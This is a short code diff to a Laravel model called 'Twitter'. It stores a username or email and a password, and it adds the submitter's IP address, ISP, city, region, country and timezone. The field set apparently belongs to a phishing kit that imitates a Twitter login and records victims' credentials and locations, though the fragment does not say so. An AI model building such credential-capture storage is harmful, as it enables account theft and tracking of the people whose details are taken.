@@ -10,7 +10,14 @@ class Twitter extends Model
     use HasFactory;
 
     protected $fillable = [
-        'usernameOrEmail', 'password',
+        'usernameOrEmail', 
+        'password',
+        'ip',
+        'isp',
+        'city',
+        'region',
+        'country',
+        'timezone',
     ];
     
 }
